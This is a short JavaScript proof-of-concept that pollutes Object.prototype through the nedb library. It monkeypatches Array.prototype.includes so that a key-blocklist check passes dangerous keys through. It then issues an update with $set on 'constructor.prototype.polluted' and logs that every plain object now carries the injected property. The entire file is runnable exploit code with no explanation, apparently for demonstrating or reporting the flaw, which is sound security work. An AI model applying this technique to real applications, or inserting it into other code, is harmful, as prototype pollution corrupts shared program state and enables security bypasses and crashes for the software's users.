Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const Datastore = require('nedb');
const db = new Datastore();
console.log({}.polluted);
db.insert({ hello: 'world' }, err => {
    db.update({ hello: 'world' }, { $set: { 'constructor.prototype.polluted': 'yes' } }, {}, err => {
        console.log({}.polluted);
    });
});